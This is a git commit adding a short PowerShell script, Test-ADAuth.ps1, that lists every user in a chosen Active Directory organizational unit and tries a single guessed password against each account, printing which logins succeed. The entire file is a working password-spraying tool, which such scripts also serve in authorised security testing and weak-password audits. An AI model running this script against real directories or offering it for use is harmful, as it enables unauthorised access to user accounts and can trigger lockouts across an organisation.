4a8b81c29ddfbe1045770bfe39912763549d40eb
Brandon <willjasen@gmail.com>
2017-02-20 16:25:43 -0500

    Create Test-ADAuth.ps1

---
+++ Test-ADAuth.ps1
@@ -0,0 +1,37 @@
+Import-Module ActiveDirectory
+
+Function Test-ADAuthentication {
+    param($username,$password)
+    (new-object directoryservices.directoryentry "",$username,$password).psbase.name -ne $null
+}
+
+$PasswordToGuess=""
+
+$SearchBase = ""
+
+# Get user input
+$DomainName = Read-Host "Enter the domain name"
+$OU = Read-Host "Enter the organization unit"
+
+# Split the string by .
+$DomainParts = $DomainName.split(".")
+
+# Create the LDAP search string
+$SearchBase = "OU=" + $OU + ","
+ForEach($Part in $DomainParts) {
+  $SearchBase = $SearchBase + "DC=" + $Part + ","
+}
+
+# Remove the last character (the extra comma)
+$SearchBase = $SearchBase.Substring(0,$SearchBase.Length-1)
+
+Write-Host "Searching: " $SearchBase
+
+# Return a list of usernames
+$Usernames = Get-ADUser -Filter * -SearchBase $SearchBase | Select -Exp SamAccountname
+
+ForEach ($Username in $Usernames)
+{
+  $guessed = Test-ADAuthentication $Username $PasswordToGuess
+  Write-Host $Username ": " $guessed
+}
